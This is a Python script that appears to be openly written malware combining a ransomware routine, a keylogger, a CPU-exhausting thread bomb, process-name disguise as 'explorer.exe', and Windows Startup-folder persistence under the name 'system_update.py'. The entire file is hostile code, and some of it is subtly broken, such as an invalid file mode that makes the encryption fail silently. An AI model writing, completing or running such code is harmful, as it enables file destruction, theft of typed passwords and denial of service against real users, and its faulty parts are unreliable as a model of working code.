import os
import time
import threading
import shutil
from uu import decode

import psutil
import base64
from cryptography.fernet import Fernet
from pynput.keyboard import Listener
import sys
import random

key = Fernet.generate_key()
cipher = Fernet(key)
LOG_FILE = 'keystrokes.txt'
def encrypt_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        encrypted_data = cipher.encrypt(file_data)
        with open(file_path + ".enc", ".wb") as f:
            f.write(encrypted_data)
        os.remove(file_path)
        return True
    except:
        return False
def ransomware():
    target_dir = "test_victim"
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
        with open(os.path.join(target_dir, "example.txt"),"w") as f:
            f.write("This is a test file.")
    for root, _ , files in os.walk(target_dir):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(".enc"):
                encrypt_file(file_path)
    with open("readme.txt" , "w") as f:
        f.write(f"faylingiz shifrlangan kalit:{base64.b64encode(key).decode()}")

def keylogger():
    def on_press(key):
        with open(LOG_FILE, 'a') as f:
                f.write(f'{time.ctime()} - {str(key)}\n')
    with Listener(on_press=on_press) as listener:
        listener.join()
def overload_system():
    def cpu_killer():
        while True:
            random.random()
    for _ in range(10):
        threading.Thread(target=cpu_killer, daemon=True).start()

def hide_process():
    try:
        psutil.Process().name = "explorer.exe"
    except:
        pass
def persistance():
    if os.name == 'nt':
        script_path = os.path.abspath(__file__)
        startup_path = os.path.join(os.getenv('APPDATA'), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        shutil.copy(script_path, startup_path + "\\system_update.py")

def backdoor_main():
    hide_process()
    persistance()
    threading.Thread(target=ransomware, daemon=True).start()
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=overload_system, daemon=True).start()
    while True:
        time.sleep(60)

if __name__ == "__main__":
    threading.Thread(target=backdoor_main, daemon=True).start()
    while True:
        time.sleep(1000)